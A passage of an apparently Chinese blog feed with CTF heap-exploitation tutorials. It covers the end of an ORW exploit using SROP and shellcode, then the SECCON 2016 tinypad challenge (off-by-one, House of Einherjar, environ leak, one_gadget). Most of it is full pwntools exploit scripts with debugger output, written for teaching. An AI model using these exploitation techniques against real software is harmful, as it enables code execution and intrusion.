enabled</span></span><br><span class="line"><span class="comment"># RUNPATH:  '/usr/lib/glibc/2.23-0ubuntu10_amd64/'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choice</span><span class="params">(idx)</span>:</span></span><br><span class="line">    sla(<span class="string">"Your Choice: "</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span><span class="params">(size, content)</span>:</span></span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">"Please input size: "</span>, str(size))</span><br><span class="line">    <span class="keyword">if</span> len(content) == (size+<span class="number">1</span>):</span><br><span class="line">        sa(<span class="string">"Please input content: "</span>, content)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        sla(<span class="string">"Please input content: "</span>, content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx, content)</span>:</span></span><br><span class="line">    choice(<span class="number">3</span>)</span><br><span class="line">    sla(<span class="string">"Please input idx: "</span>, str(idx))</span><br><span class="line">    sa(<span class="string">"Please input content: "</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    choice(<span class="number">2</span>)</span><br><span class="line">    sla(<span class="string">"Please input idx: "</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exit</span><span class="params">()</span>:</span></span><br><span class="line">    choice(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    new(<span class="number">0x68</span>, <span class="string">'1'</span>) <span class="comment">#0</span></span><br><span class="line">    new(<span class="number">0x78</span>, <span class="string">'2'</span>) <span class="comment">#1</span></span><br><span class="line">    payload = p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>)</span><br><span class="line">    new(<span class="number">0x68</span>, payload*<span class="number">6</span>) <span class="comment">#2</span></span><br><span class="line">    new(<span class="number">0x68</span>, payload*<span class="number">6</span>) <span class="comment">#3</span></span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">    new(<span class="number">0x68</span>, <span class="string">'a'</span>*<span class="number">0x60</span> + p64(<span class="number">0</span>) + p8(<span class="number">0xf1</span>)) <span class="comment">#0</span></span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">    delete(<span class="number">2</span>)</span><br><span class="line">    new(<span class="number">0x78</span>, <span class="string">'1'</span>) <span class="comment">#1</span></span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">    new(<span class="number">0x68</span>, <span class="string">'a'</span>*<span class="number">0x60</span> + p64(<span class="number">0</span>) + p8(<span class="number">0xa1</span>)) <span class="comment">#0</span></span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">    new(<span class="number">0x98</span>, <span class="string">'1'</span>) <span class="comment">#1</span></span><br><span class="line">    edit(<span class="number">1</span>, <span class="string">'b'</span>*<span class="number">0x70</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>) + p16(<span class="number">0x8620</span><span class="number">-0x40</span><span class="number">-0x3</span>))</span><br><span class="line">    new(<span class="number">0x68</span>, <span class="string">'\n'</span>) <span class="comment">#2</span></span><br><span class="line">    new(<span class="number">0x68</span>, <span class="string">'\x00'</span>*<span class="number">0x33</span> + p64(<span class="number">0xfbad1800</span>) + p64(<span class="number">0</span>)*<span class="number">3</span> ) <span class="comment">#3</span></span><br><span class="line">    r(<span class="number">0x88</span>)</span><br><span class="line">    libc.address = uu64(r(<span class="number">8</span>)) - libc.symbols[<span class="string">'_IO_2_1_stdin_'</span>]</span><br><span class="line">    lg(<span class="string">"libc.addressess"</span>, libc.address)</span><br><span class="line"></span><br><span class="line">    edit(<span class="number">1</span>, <span class="string">'b'</span>*<span class="number">0x70</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x91</span>))</span><br><span class="line">    delete(<span class="number">2</span>)</span><br><span class="line">    edit(<span class="number">1</span>, <span class="string">'b'</span>*<span class="number">0x70</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x91</span>) + p64(<span class="number">0</span>) + p64(libc.symbols[<span class="string">'__free_hook'</span>]<span class="number">-0x20</span>))</span><br><span class="line">    new(<span class="number">0x88</span>, <span class="string">'2'</span>) <span class="comment">#2</span></span><br><span class="line">    edit(<span class="number">1</span>, <span class="string">'b'</span>*<span class="number">0x70</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>))</span><br><span class="line">    delete(<span class="number">2</span>)</span><br><span class="line">    edit(<span class="number">1</span>, <span class="string">'b'</span>*<span class="number">0x70</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>) + p64(libc.symbols[<span class="string">'__free_hook'</span>]<span class="number">-0x13</span>))</span><br><span class="line">    frame = SigreturnFrame()</span><br><span class="line">    frame.rdi = <span class="number">0</span></span><br><span class="line">    frame.rsi = (libc.symbols[<span class="string">'__free_hook'</span>]) &amp; <span class="number">0xfffffffffffff000</span> <span class="comment">#</span></span><br><span class="line">    frame.rdx = <span class="number">0x2000</span></span><br><span class="line">    frame.rsp = (libc.symbols[<span class="string">'__free_hook'</span>]) &amp; <span class="number">0xfffffffffffff000</span></span><br><span class="line">    frame.rip = libc.address + <span class="number">0x00000000000bc375</span> <span class="comment">#: syscall; ret; </span></span><br><span class="line">    payload = str(frame)</span><br><span class="line">    new(<span class="number">0x68</span>, payload[<span class="number">0x80</span>:<span class="number">0x80</span>+<span class="number">0x60</span>])</span><br><span class="line">    new(<span class="number">0x68</span>, <span class="string">'\x00'</span>*<span class="number">3</span> + p64(libc.symbols[<span class="string">'setcontext'</span>]+<span class="number">53</span>))</span><br><span class="line">    edit(<span class="number">1</span>, payload[:<span class="number">0x98</span>])</span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">    layout = [</span><br><span class="line">        libc.address + <span class="number">0x0000000000021102</span>, <span class="comment">#: pop rdi; ret; </span></span><br><span class="line">        libc.symbols[<span class="string">'__free_hook'</span>] &amp; <span class="number">0xfffffffffffff000</span>,</span><br><span class="line">        libc.address + <span class="number">0x00000000000202e8</span>, <span class="comment">#: pop rsi; ret; </span></span><br><span class="line">        <span class="number">0x2000</span>,</span><br><span class="line">        libc.address + <span class="number">0x0000000000001b92</span>, <span class="comment">#: pop rdx; ret; </span></span><br><span class="line">        <span class="number">7</span>,</span><br><span class="line">        libc.address + <span class="number">0x0000000000033544</span>, <span class="comment">#: pop rax; ret; </span></span><br><span class="line">        <span class="number">10</span>,</span><br><span class="line">        libc.address + <span class="number">0x00000000000bc375</span>, <span class="comment">#: syscall; ret; </span></span><br><span class="line">        libc.address + <span class="number">0x0000000000002a71</span>, <span class="comment">#: jmp rsp; </span></span><br><span class="line">    ]</span><br><span class="line">    shellcode = asm(<span class="string">'''</span></span><br><span class="line"><span class="string">    push 0x67616c66</span></span><br><span class="line"><span class="string">    mov rdi, rsp</span></span><br><span class="line"><span class="string">    xor esi, esi</span></span><br><span class="line"><span class="string">    mov eax, 2</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov edi, eax</span></span><br><span class="line"><span class="string">    mov rsi, rsp</span></span><br><span class="line"><span class="string">    mov edx, 0x100</span></span><br><span class="line"><span class="string">    xor eax, eax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov edx, eax</span></span><br><span class="line"><span class="string">    mov rsi, rsp</span></span><br><span class="line"><span class="string">    mov edi, 1</span></span><br><span class="line"><span class="string">    mov eax, edi</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    '''</span>)</span><br><span class="line">    shellcode = shellcraft.amd64.open(<span class="string">'flag'</span>)</span><br><span class="line">    shellcode += <span class="string">'''</span></span><br><span class="line"><span class="string">    mov edi, eax</span></span><br><span class="line"><span class="string">    mov rsi, rsp</span></span><br><span class="line"><span class="string">    mov edx, 0x100</span></span><br><span class="line"><span class="string">    xor eax, eax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov edi, 1</span></span><br><span class="line"><span class="string">    mov rsi, rsp</span></span><br><span class="line"><span class="string">    push 1</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line"></span><br><span class="line">    shellcode = asm(<span class="string">'''</span></span><br><span class="line"><span class="string">    push 0x67616c66</span></span><br><span class="line"><span class="string">mov rdi,rsp</span></span><br><span class="line"><span class="string">xor esi,esi</span></span><br><span class="line"><span class="string">push 2</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">mov rdi,rax</span></span><br><span class="line"><span class="string">mov rsi,rsp</span></span><br><span class="line"><span class="string">mov edx,0x100</span></span><br><span class="line"><span class="string">xor eax,eax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">mov edi,1</span></span><br><span class="line"><span class="string">mov rsi,rsp</span></span><br><span class="line"><span class="string">push 1</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">    '''</span>)</span><br><span class="line">    <span class="comment">#shellcode = asm(shellcode, arch='amd64')</span></span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    s(flat(layout) + shellcode)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#libc.address = uu64(r(8)) - libc.symbols['__IO_2_1_stdin_']</span></span><br><span class="line">    <span class="comment">#lg("libc.address", libc.address)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            exp()</span><br><span class="line">            io.interactive()</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            print(e)</span><br><span class="line">            io.close()</span><br><span class="line">            io = process(exe)</span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>堆部分我觉得入门已经学完了，至于house of 部分，等到用到的时候在学，因为堆结构和点看出来了，后面就看个人了，可以现学house of部分</p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><span class="exturl" data-url="aHR0cDovL2Jsb2cuZW9uZXcuY24vYXJjaGl2ZXMvMTI0Mw==" title="http://blog.eonew.cn/archives/1243">ex师傅的orw<i class="fa fa-external-link"></i></span></p><p>emm,萝卜师傅那篇文章找不到了，参考了他的那个数组负数改stdout部分</p><p><strong>本文作者</strong>：NoOne<br><strong>本文地址</strong>： <a href="https://noone-hub.github.io/posts/62c86bb4/">https://noone-hub.github.io/posts/62c86bb4/</a><br><strong>版权声明</strong>：转载请注明出处！</p><!-- rebuild by neat -->]]></content>
      <categories>
        <category>bin</category>
        <category>pwn</category>
        <category>堆</category>
      </categories>
      <tags>
        <tag>pwn， 堆</tag>
      </tags>
  </entry>
  <entry>
    <title>pwn堆入门系列教程9</title>
    <url>/posts/14c79378/</url>
    <content><![CDATA[<h1 id="pwn堆入门系列教程9"><a href="#pwn堆入门系列教程9" class="headerlink" title="pwn堆入门系列教程9"></a>pwn堆入门系列教程9</h1><p>本文首发于先知社区</p><p><span class="exturl" data-url="aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvNjA4Nw==" title="https://xz.aliyun.com/t/6087">pwn堆入门系列教程1<i class="fa fa-external-link"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvNjE2OQ==" title="https://xz.aliyun.com/t/6169">pwn堆入门系列教程2<i class="fa fa-external-link"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvNjI1Mg==" title="https://xz.aliyun.com/t/6252">pwn堆入门系列教程3<i class="fa fa-external-link"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvNjMyMg==" title="https://xz.aliyun.com/t/6322">pwn堆入门系列教程4<i class="fa fa-external-link"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvNjM3Nw==" title="https://xz.aliyun.com/t/6377">pwn堆入门系列教程5<i class="fa fa-external-link"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvNjQwNg==" title="https://xz.aliyun.com/t/6406">pwn堆入门系列教程6<i class="fa fa-external-link"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvNjQ0OQ==" title="https://xz.aliyun.com/t/6449">pwn堆入门系列教程7<i class="fa fa-external-link"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvNjQ3Mw==" title="https://xz.aliyun.com/t/6473">pwn堆入门系列教程8<i class="fa fa-external-link"></i></span></p><p>学习House Of Einherjar</p><h2 id="2016-Seccon-tinypad"><a href="#2016-Seccon-tinypad" class="headerlink" title="2016 Seccon tinypad"></a>2016 Seccon tinypad</h2><p>这道题说难不难。。我也做得久了，因为exp看不懂啊，这么复杂。。。后来简化了下，感觉轻松点了</p><a id="more"></a><!-- build time:Sat Dec 28 2019 22:32:14 GMT+0800 (China Standard Time) --><p>功能分析，新增，删除，编辑，退出</p><p>至于洞，off-by-one</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __int64 __<span class="function">fastcall <span class="title">read_until</span><span class="params">(<span class="keyword">char</span> *a1, <span class="keyword">unsigned</span> __int64 len, <span class="keyword">unsigned</span> <span class="keyword">int</span> terminate)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [rsp+Ch] [rbp-34h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 i; <span class="comment">// [rsp+28h] [rbp-18h]</span></span><br><span class="line">  __int64 v6; <span class="comment">// [rsp+30h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v4 = terminate;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0L</span>L; i &lt; len; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v6 = read_n(<span class="number">0L</span>L, &amp;a1[i], <span class="number">1L</span>L);</span><br><span class="line">    <span class="keyword">if</span> ( v6 &lt; <span class="number">0</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1L</span>L;</span><br><span class="line">    <span class="keyword">if</span> ( !v6 || a1[i] == v4 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  a1[i] = <span class="number">0</span>; #a1[i]可以是a1[len],多了一个字节</span><br><span class="line">  <span class="keyword">if</span> ( i == len &amp;&amp; a1[len - <span class="number">1</span>] != <span class="string">'\n'</span> )</span><br><span class="line">    dummyinput(v4);</span><br><span class="line">  <span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="漏洞利用过程"><a href="#漏洞利用过程" class="headerlink" title="漏洞利用过程"></a>漏洞利用过程</h3><h4 id="堆操作初始化部分"><a href="#堆操作初始化部分" class="headerlink" title="堆操作初始化部分"></a>堆操作初始化部分</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'./tinypad'</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line">io = process(<span class="string">'./tinypad'</span>)</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choice</span><span class="params">(idx)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"(CMD)&gt;&gt;&gt; "</span>, idx)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size, content)</span>:</span></span><br><span class="line">    choice(<span class="string">"A"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"(SIZE)&gt;&gt;&gt; "</span>, str(size))</span><br><span class="line">    io.sendlineafter(<span class="string">"(CONTENT)&gt;&gt;&gt; "</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">remove</span><span class="params">(idx)</span>:</span></span><br><span class="line">    choice(<span class="string">"D"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"(INDEX)&gt;&gt;&gt; "</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx, content)</span>:</span></span><br><span class="line">    choice(<span class="string">"E"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"(INDEX)&gt;&gt;&gt; "</span>, str(idx))</span><br><span class="line">    io.sendlineafter(<span class="string">"(CONTENT)&gt;&gt;&gt; "</span>, content)</span><br><span class="line">    io.sendlineafter(<span class="string">"(Y/n)&gt;&gt;&gt; "</span>, <span class="string">"Y"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">quit</span><span class="params">()</span>:</span></span><br><span class="line">    choice(<span class="string">"Q"</span>)</span><br></pre></td></tr></table></figure><h4 id="泄露地址"><a href="#泄露地址" class="headerlink" title="泄露地址"></a>泄露地址</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#stage 1 leak the addr</span></span><br><span class="line">add(<span class="number">0x80</span>, <span class="string">'1'</span>*<span class="number">0x80</span>)</span><br><span class="line">add(<span class="number">0x80</span>, <span class="string">'2'</span>*<span class="number">0x80</span>)</span><br><span class="line">add(<span class="number">0x80</span>, <span class="string">'3'</span>*<span class="number">0x80</span>)</span><br><span class="line">add(<span class="number">0x80</span>, <span class="string">'4'</span>*<span class="number">0x80</span>)</span><br><span class="line">remove(<span class="number">3</span>)</span><br><span class="line">remove(<span class="number">1</span>)</span><br><span class="line">io.recvuntil(<span class="string">"INDEX: 1\n"</span>)</span><br><span class="line">io.recvuntil(<span class="string">" # CONTENT: "</span>)</span><br><span class="line">heap = u64(io.recvline().rstrip().ljust(<span class="number">8</span>, <span class="string">'\x00'</span>)) - <span class="number">0x120</span></span><br><span class="line">io.success(<span class="string">"heap: 0x%x"</span> % heap)</span><br><span class="line">io.recvuntil(<span class="string">"INDEX: 3\n"</span>)</span><br><span class="line">io.recvuntil(<span class="string">" # CONTENT: "</span>)</span><br><span class="line">leak_libc = u64(io.recvline().strip().ljust(<span class="number">8</span>, <span class="string">'\x00'</span>)) - <span class="number">88</span></span><br><span class="line">io.success(<span class="string">"main_arena: 0x%x"</span> %leak_libc)</span><br><span class="line">libc_base = leak_libc - <span class="number">0x3c4b20</span></span><br><span class="line">remove(<span class="number">2</span>)</span><br><span class="line">remove(<span class="number">4</span>)</span><br></pre></td></tr></table></figure><p>这个部分简单啊，leak，全在unsortedbin里，这里学到一个知识点是rstrip,通常我只用过strip，<br>该rstrip()方法删除所有尾随字符（字符串末尾的字符），空格是要删除的默认尾随字符<br>至于88这个是main_arena+88，减掉就是main_arena</p><h4 id="House-Of-Einherjar"><a href="#House-Of-Einherjar" class="headerlink" title="House Of Einherjar"></a>House Of Einherjar</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x10</span>, <span class="string">'1'</span>*<span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">0x100</span>, <span class="string">'2'</span>*<span class="number">0xf8</span> + p64(<span class="number">0x11</span>))</span><br><span class="line">add(<span class="number">0x100</span>, <span class="string">'3'</span>*<span class="number">0xf8</span>)</span><br><span class="line">add(<span class="number">0x100</span>, <span class="string">'4'</span>*<span class="number">0xf8</span>)</span><br><span class="line"></span><br><span class="line">tinypad = <span class="number">0x0000000000602040</span></span><br><span class="line">offset = heap + <span class="number">0x20</span> - (<span class="number">0x602040</span> + <span class="number">0x20</span>)</span><br><span class="line">io.success(<span class="string">"offset: 0x%x"</span> % offset)</span><br><span class="line">fake_chunk = p64(<span class="number">0</span>) + p64(<span class="number">0x101</span>) + p64(<span class="number">0x602060</span>)*<span class="number">2</span></span><br><span class="line">edit(<span class="number">3</span>, <span class="string">"4"</span>*<span class="number">0x20</span> + fake_chunk)</span><br><span class="line">remove(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x18</span>, <span class="string">'1'</span>*<span class="number">0x10</span> + p64(offset))</span><br><span class="line">remove(<span class="number">2</span>)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">edit(<span class="number">4</span>, <span class="string">"4"</span>*<span class="number">0x20</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x101</span>) + p64(leak_libc + <span class="number">88</span>)*<span class="number">2</span>)</span><br></pre></td></tr></table></figure><p>原解我感觉把题目搞复杂了，不需要for循环覆盖那个pre_size，完全可以利用add的时候加上就完了，<br>house of einherjar这个攻击方法有点类似于unlink，不过又不太相似</p><ol><li><p>目标:0x602060这个位置<br>heap + 0x20是第二个chunk位置<br>我们目的就是让第二个chunk的上一个chunk达到0x602060<br>所以pre_size就是第二个chunk位置减去0x602060<br>offset = heap + 0x20 - (0x602040 + 0x20)</p></li><li><p>fake_chunk这里是从tinypad开始地址开始覆盖的，前面0x20个作为后面填充部分，防止多次写的时候覆盖到<br>然后指针不像unlink那样了，<br>p-&gt;fd = p<br>p-&gt;bk = p</p></li><li><p>这里edit的时候都会从tinypad开始覆盖，所以编辑别个也可以的<br>edit(3, “4”*0x20 + fake_chunk)</p></li><li><p>remove(1)在add(0x18)，利用tcache的复用就行了，原exp的解是搞得很复杂，循环单字节null填充，太麻烦了感觉</p></li><li><p>这点不用这么复杂，0x101是为了后面分配用的，而p64(leak_libc+88)*2 这里，你只要bk是个可写的地址就行了，不要是不可写的就行，unsortedbin攻击里讲过</p></li></ol><p>引用ctf-wiki</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">#在 glibc/<span class="built_in">malloc</span>/<span class="built_in">malloc</span>.c 中的 _int_malloc 有这么一段代码，当将一个 unsorted bin 取出的时候，会将 bck-&gt;fd 的位置写入本 Unsorted Bin 的位置。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">          <span class="comment">/* remove from unsorted list */</span></span><br><span class="line">          <span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">            malloc_printerr (<span class="string">"malloc(): corrupted unsorted chunks 3"</span>);</span><br><span class="line">          unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">          bck-&gt;fd = unsorted_chunks (av);</span><br></pre></td></tr></table></figure><p>edit(4, “4”<em>0x20 + p64(0) + p64(0x101) + p64(leak_libc + 88)</em>2)</p><h4 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#stage 3</span></span><br><span class="line">one_gadget = libc_base + <span class="number">0x45216</span></span><br><span class="line">io.success(<span class="string">"libc_base: 0x%x"</span> % libc_base)</span><br><span class="line">environ_pointer = libc_base + libc.symbols[<span class="string">'__environ'</span>]</span><br><span class="line"></span><br><span class="line">io.success(<span class="string">"environ_pointer: 0x%x"</span> % environ_pointer)</span><br><span class="line">add(<span class="number">0xf0</span>, <span class="string">'1'</span>*<span class="number">0xd0</span> + p64(<span class="number">0x18</span>) + p64(environ_pointer) + <span class="string">'a'</span>*<span class="number">8</span> + p64(<span class="number">0x602148</span>))</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">" #   INDEX: 1\n"</span>)</span><br><span class="line">io.recvuntil(<span class="string">" # CONTENT: "</span>)</span><br><span class="line">main_ret = u64(io.recvline().rstrip().ljust(<span class="number">8</span>, <span class="string">'\x00'</span>)) - <span class="number">0x8</span> * <span class="number">30</span></span><br><span class="line">io.success(<span class="string">"main_ret: %x"</span> % main_ret)</span><br><span class="line">edit(<span class="number">2</span>, p64(main_ret))</span><br><span class="line">edit(<span class="number">1</span>, p64(one_gadget))</span><br><span class="line">quit()</span><br></pre></td></tr></table></figure><p>这里学到了一个新方法，通过environ泄露main函数ret地址，然后覆盖main_ret</p><p>在 Linux 系统中，glibc 的环境指针 environ(environment pointer) 为程序运行时所需要的环境变量表的起始地址，环境表中的指针指向各环境变量字符串。从以下结果可知环境指针 environ 在栈空间的高地址处。因此，可通过 environ 指针泄露栈地址。<br><span class="exturl" data-url="aHR0cDovLzB4NGM0My5jbi8yMDE4LzEwMTMvc3RhY2stb3ZlcmZsb3ctc21hc2gtdXRpbGl6YXRpb24v" title="http://0x4c43.cn/2018/1013/stack-overflow-smash-utilization/">讲解这部分的文章<i class="fa fa-external-link"></i></span></p><p>这里还用到个常用攻击方法，覆盖两个指针，一个用来控制另一个地址的，这个跟unlink那会学的攻击手法一样的，至于0x8*30,可以用查看内存中对比</p><p>自己调试的时候可以main函数尾部下个断，可以看到我这个结果</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Breakpoint 1, 0x0000000000400e68 <span class="keyword">in</span> main ()</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">────────────────────────────────────────────────────────────────────────────────────────[ REGISTERS ]─────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line"> RAX  0x0</span><br><span class="line"> RBX  0x0</span><br><span class="line"> RCX  0x0</span><br><span class="line"> RDX  0x7f5fc76f6ae0 (_nl_C_LC_CTYPE_toupper) ◂— add    byte ptr [rax], 0</span><br><span class="line"> RDI  0x51</span><br><span class="line"> RSI  0x0</span><br><span class="line"> R8   0x1</span><br><span class="line"> R9   0x1999999999999999</span><br><span class="line"> R10  0x0</span><br><span class="line"> R11  0x246</span><br><span class="line"> R12  0x4006e0 (_start) ◂— xor    ebp, ebp</span><br><span class="line"> R13  0x7fff53d21f40 ◂— 0x1</span><br><span class="line"> R14  0x0</span><br><span class="line"> R15  0x0</span><br><span class="line"> RBP  0x401370 (__libc_csu_init) ◂— push   r15</span><br><span class="line"> RSP  0x7fff53d21e68 —▸ 0x7f5fc75a0830 (__libc_start_main+240) ◂— mov    edi, eax</span><br><span class="line"> RIP  0x400e68 (main+1541) ◂— ret    </span><br><span class="line">──────────────────────────────────────────────────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line"> ► 0x400e68       &lt;main+1541&gt;                ret             &lt;0x7f5fc75a0830; __libc_start_main+240&gt;</span><br><span class="line">    ↓</span><br><span class="line">   0x7f5fc75a0830 &lt;__libc_start_main+240&gt;    mov    edi, eax</span><br><span class="line">   0x7f5fc75a0832 &lt;__libc_start_main+242&gt;    call   <span class="built_in">exit</span> &lt;0x7f5fc75ba030&gt;</span><br><span class="line"> </span><br><span class="line">   0x7f5fc75a0837 &lt;__libc_start_main+247&gt;    xor    edx, edx</span><br><span class="line">   0x7f5fc75a0839 &lt;__libc_start_main+249&gt;    jmp    __libc_start_main+57 &lt;0x7f5fc75a0779&gt;</span><br><span class="line"> </span><br><span class="line">   0x7f5fc75a083e &lt;__libc_start_main+254&gt;    mov    rax, qword ptr [rip + 0x3a8ecb] &lt;0x7f5fc7949710&gt;</span><br><span class="line">   0x7f5fc75a0845 &lt;__libc_start_main+261&gt;    ror    rax, 0x11</span><br><span class="line">   0x7f5fc75a0849 &lt;__libc_start_main+265&gt;    xor    rax, qword ptr fs:[0x30]</span><br><span class="line">   0x7f5fc75a0852 &lt;__libc_start_main+274&gt;    call   rax</span><br><span class="line"> </span><br><span class="line">   0x7f5fc75a0854 &lt;__libc_start_main+276&gt;    mov    rax, qword ptr [rip + 0x3a8ea5] &lt;0x7f5fc7949700&gt;</span><br><span class="line">   0x7f5fc75a085b &lt;__libc_start_main+283&gt;    ror    rax, 0x11</span><br><span class="line">──────────────────────────────────────────────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">00:0000│ rsp  0x7fff53d21e68 —▸ 0x7f5fc75a0830 (__libc_start_main+240) ◂— mov    edi, eax</span><br><span class="line">01:0008│      0x7fff53d21e70 ◂— 0x1</span><br><span class="line">02:0010│      0x7fff53d21e78 —▸ 0x7fff53d21f48 —▸ 0x7fff53d233b3 ◂— <span class="string">'./tinypad'</span></span><br><span class="line">03:0018│      0x7fff53d21e80 ◂— 0x1c7b6fca0</span><br><span class="line">04:0020│      0x7fff53d21e88 —▸ 0x400863 (main) ◂— push   rbp</span><br><span class="line">05:0028│      0x7fff53d21e90 ◂— 0x0</span><br><span class="line">06:0030│      0x7fff53d21e98 ◂— 0x63cd5245d4e10d9c</span><br><span class="line">07:0038│      0x7fff53d21ea0 —▸ 0x4006e0 (_start) ◂— xor    ebp, ebp</span><br><span class="line">────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line"> ► f 0           400e68 main+1541</span><br><span class="line">   f 1     7f5fc75a0830 __libc_start_main+24</span><br></pre></td></tr></table></figure><p>为什么是libc_start_main?建议看看第三篇讲的linux x86程序启动<br>给链接</p><p><span class="exturl" data-url="aHR0cHM6Ly9sdW9tdXhpYW94aWFvLmNvbS8/cD01MTY=" 